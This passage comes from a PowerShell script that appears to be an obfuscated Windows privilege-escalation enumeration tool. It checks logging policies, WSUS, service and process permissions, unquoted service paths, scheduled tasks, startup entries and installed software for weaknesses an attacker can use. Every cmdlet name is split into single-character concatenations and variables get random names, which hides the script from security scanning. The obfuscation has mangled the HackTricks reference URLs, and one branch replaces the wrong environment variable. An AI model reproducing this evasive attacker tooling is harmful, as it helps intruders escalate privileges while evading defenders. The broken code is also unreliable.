if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
}
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
}
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
}
 

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| PowerShell Script Block Log Check"
 
if ( &('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKCU:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKCU:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
}
if ( &('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
}
if ( &('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
}
if ( &('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| WSUS check for http and UseWAServer = 1, if true, might be vulnerable to exploit"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#wsus" -ForegroundColor Yellow
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
}
if ((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU -Name "USEWUServer" -ErrorAction SilentlyContinue).UseWUServer) {
  (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU -Name "USEWUServer").UseWUServer
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Internet Settings HKCU / HKLM"

$fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv = (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -ErrorAction SilentlyContinue).Property
foreach ($cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt in $fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv) {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt - $((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -ErrorAction SilentlyContinue).getValue($cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt))"
}
 
$fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv = (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -ErrorAction SilentlyContinue).Property
foreach ($cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt in $fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv) {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt - $((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -ErrorAction SilentlyContinue).getValue($cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt))"
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| RUNNING PROCESSES"


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking user permissions on running processes"
&('G' + 'e' + 't' + '-' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's') | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') Path -Unique | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { &('S' + 't' + 'a' + 'r' + 't' + '-' + 'A' + 'C' + 'L' + 'C' + 'h' + 'e' + 'c' + 'k') -Target $_.path }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| System processes"
&('S' + 't' + 'a' + 'r' + 't' + '-' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's') tasklist -ArgumentList '/v /fi "username eq system"' -Wait -NoNewWindow


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| SERVICE path vulnerable check"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Checking for vulnerable service .exe"
$SLxJhEgWYlSHEUcBgdCtiNZtIVbGOIejEiDFerXRbeDxufmboUUIUXtpiiWvbcaMLXSJpGGoXcDTiuTYJaAmYUsVbIZLEsMahhPa = @{}
&('G' + 'e' + 't' + '-' + 'W' + 'm' + 'i' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') Win32_Service | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_.PathName -like '*.exe*' } | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  $OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF = ($_.PathName -split '(?<=\.exe\b)')[0].Trim('"')
  $SLxJhEgWYlSHEUcBgdCtiNZtIVbGOIejEiDFerXRbeDxufmboUUIUXtpiiWvbcaMLXSJpGGoXcDTiuTYJaAmYUsVbIZLEsMahhPa[$OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF] = $_.Name
}
foreach ( $uBMsunnNWCvLUEkbQqeikPDXbGFppekUziIOmbZMZeguNtGJaesgtYvboXNTlaJCjeRFevHJhHCoxzNqWNgDgukYJuxfaNCEfwDy in ($SLxJhEgWYlSHEUcBgdCtiNZtIVbGOIejEiDFerXRbeDxufmboUUIUXtpiiWvbcaMLXSJpGGoXcDTiuTYJaAmYUsVbIZLEsMahhPa | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -Unique).GetEnumerator()) {
  &('S' + 't' + 'a' + 'r' + 't' + '-' + 'A' + 'C' + 'L' + 'C' + 'h' + 'e' + 'c' + 'k') -Target $uBMsunnNWCvLUEkbQqeikPDXbGFppekUziIOmbZMZeguNtGJaesgtYvboXNTlaJCjeRFevHJhHCoxzNqWNgDgukYJuxfaNCEfwDy.Name -ServiceName $uBMsunnNWCvLUEkbQqeikPDXbGFppekUziIOmbZMZeguNtGJaesgtYvboXNTlaJCjeRFevHJhHCoxzNqWNgDgukYJuxfaNCEfwDy.Value
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking for Unquoted Service Paths"

UnquotedServicePathCheck


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking Service Registry Permissions"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "This will take some time."

&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') 'HKLM:\System\CurrentControlSet\services\' | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF = $_.Name.Replace("HKEY_LOCAL_MACHINE", "hklm:")
  &('S' + 't' + 'a' + 'r' + 't' + '-' + 'a' + 'c' + 'l' + 'c' + 'h' + 'e' + 'c' + 'k') -Target $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| SCHEDULED TASKS vulnerable check"


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Testing access to c:\windows\system32\tasks"
if (&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') "c:\windows\system32\tasks" -ErrorAction SilentlyContinue) {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Access confirmed, may need futher investigation"
  &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') "c:\windows\system32\tasks"
}
else {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No admin access to scheduled tasks folder."
  &('G' + 'e' + 't' + '-' + 'S' + 'c' + 'h' + 'e' + 'd' + 'u' + 'l' + 'e' + 'd' + 'T' + 'a' + 's' + 'k') | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_.TaskPath -notlike "\Microsoft*" } | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    $usZrYRQuxygutFBVpuuLIhYtYennrUVxyyplLuTYiOPPMAHUPSwrHBIhHDJjgjomVUyqqAgDlIdLCqGbpLWvyQLukVXbMzzGievU = $_.Actions.Execute
    if ($usZrYRQuxygutFBVpuuLIhYtYennrUVxyyplLuTYiOPPMAHUPSwrHBIhHDJjgjomVUyqqAgDlIdLCqGbpLWvyQLukVXbMzzGievU -ne $null) {
      foreach ($UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt in $usZrYRQuxygutFBVpuuLIhYtYennrUVxyyplLuTYiOPPMAHUPSwrHBIhHDJjgjomVUyqqAgDlIdLCqGbpLWvyQLukVXbMzzGievU) {
        if ($UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt -like "%windir%*") { $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt = $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt.replace("%windir%", $XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:windir) }
        elseif ($UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt -like "%SystemRoot%*") { $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt = $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt.replace("%SystemRoot%", $XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:windir) }
        elseif ($UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt -like "%localappdata%*") { $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt = $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt.replace("%localappdata%", "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:UserProfile\appdata\local") }
        elseif ($UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt -like "%appdata%*") { $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt = $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt.replace("%localappdata%", $XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:Appdata) }
        $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt = $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt.Replace('"', '')
        &('S' + 't' + 'a' + 'r' + 't' + '-' + 'A' + 'C' + 'L' + 'C' + 'h' + 'e' + 'c' + 'k') -Target $UJDJNFTNtDiHJbkTgFsyhDlmWUgeQDuUgYEMePIXWwQUVWxRhTOnIYAnqhEkXojGRpzHuGEHNBOywEqKYnZXTyjuzDPyLngnIhvt
        &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "`n"
        &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "TaskName: $($_.TaskName)"
        &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "-------------"
        &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -TypeName PSObject -Property ([Ordered]@{
          LastResult = $(($_ | &('G' + 'e' + 't' + '-' + 'S' + 'c' + 'h' + 'e' + 'd' + 'u' + 'l' + 'e' + 'd' + 'T' + 'a' + 's' + 'k' + 'I' + 'n' + 'f' + 'o')).LastTaskResult)
          NextRun    = $(($_ | &('G' + 'e' + 't' + '-' + 'S' + 'c' + 'h' + 'e' + 'd' + 'u' + 'l' + 'e' + 'd' + 'T' + 'a' + 's' + 'k' + 'I' + 'n' + 'f' + 'o')).NextRunTime)
          Status     = $_.State
          Command    = $_.Actions.execute
          Arguments  = $_.Actions.Arguments 
        }) | &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't')
      } 
    }
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| STARTUP APPLICATIONS Vulnerable Check"
"Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#&('r' + 'u' + 'n' + '-' + 'a' + 't')-startup" -ForegroundColor Yellow

@("C:\Documents and Settings\All Users\Start Menu\Programs\Startup",
  "C:\Documents and Settings\$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:Username\Start Menu\Programs\Startup", 
  "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup", 
  "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:Appdata\Microsoft\Windows\Start Menu\Programs\Startup") | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') $_) {
    &('S' + 't' + 'a' + 'r' + 't' + '-' + 'A' + 'C' + 'L' + 'C' + 'h' + 'e' + 'c' + 'k') $_
    &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') -Recurse -Force -Path $_ | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
      $kulOrLMUfmQsObQZlRZbHQdfsGoMMAYAhYKuUziIvfLVQwcoSTeoTKBdBRyRBCFzlaWXyjzCnyPEbsrCEWqexvkWAALMTUSNkUgY = $_.FullName
      if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') $kulOrLMUfmQsObQZlRZbHQdfsGoMMAYAhYKuUziIvfLVQwcoSTeoTKBdBRyRBCFzlaWXyjzCnyPEbsrCEWqexvkWAALMTUSNkUgY) { 
        &('S' + 't' + 'a' + 'r' + 't' + '-' + 'A' + 'C' + 'L' + 'C' + 'h' + 'e' + 'c' + 'k') -Target $kulOrLMUfmQsObQZlRZbHQdfsGoMMAYAhYKuUziIvfLVQwcoSTeoTKBdBRyRBCFzlaWXyjzCnyPEbsrCEWqexvkWAALMTUSNkUgY
      }
    }
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| STARTUP APPS Registry Check"

@("registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
  "registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
  "registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
  "registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce") | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  $LrfJzoTFEQIWJAbWccSDtYkFzFRyoxrJlOVkPiGyQrewnBkakKiynysJmBzEYCwIBvowkNgEkEtKIoqrqPaWXrGDyOotZlWxfigA = $_
  (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') $_) | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    $npJfuvgPnIrcsuyuZabtnHgWKKhKiIhkymzATGiIJrqbjRNigctybEgmHHaCQHppMMcIliKQtXJXxTmsoSkYOGPZdedXMwHIpmyC = $_.property
    $npJfuvgPnIrcsuyuZabtnHgWKKhKiIhkymzATGiIJrqbjRNigctybEgmHHaCQHppMMcIliKQtXJXxTmsoSkYOGPZdedXMwHIpmyC | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
      &('S' + 't' + 'a' + 'r' + 't' + '-' + 'A' + 'C' + 'L' + 'C' + 'h' + 'e' + 'c' + 'k') ((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') -Path $LrfJzoTFEQIWJAbWccSDtYkFzFRyoxrJlOVkPiGyQrewnBkakKiynysJmBzEYCwIBvowkNgEkEtKIoqrqPaWXrGDyOotZlWxfigA).$_ -split '(?<=\.exe\b)')[0].Trim('"')
    }
  }
}



&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| INSTALLED APPLICATIONS"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Generating list of installed applications"

&('G' + 'e' + 't' + '-' + 'I' + 'n' + 's' + 't' + 'a' + 'l' + 'l' + 'e' + 'd' + 'A' + 'p' + 'p' + 'l' + 'i' + 'c' + 'a' + 't' + 'i' + 'o' + 'n' + 's')

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| LOOKING FOR BASH.EXE"
&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') C:\Windows\WinSxS\ -Filter "amd64_microsoft-&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'x' + 's' + 's')-bash*" | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $((&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') $_.FullName -Recurse -Filter "*bash.exe*").FullName)
}
@("bash.exe", "wsl.exe") | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $((&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') C:\Windows\System32\ -Filter $_).FullName) }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| LOOKING FOR SCCM CLIENT"
$KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk = &('G' + 'e' + 't' + '-' + 'W' + 'm' + 'i' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * -ErrorAction SilentlyContinue | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') Name, SoftwareVersion
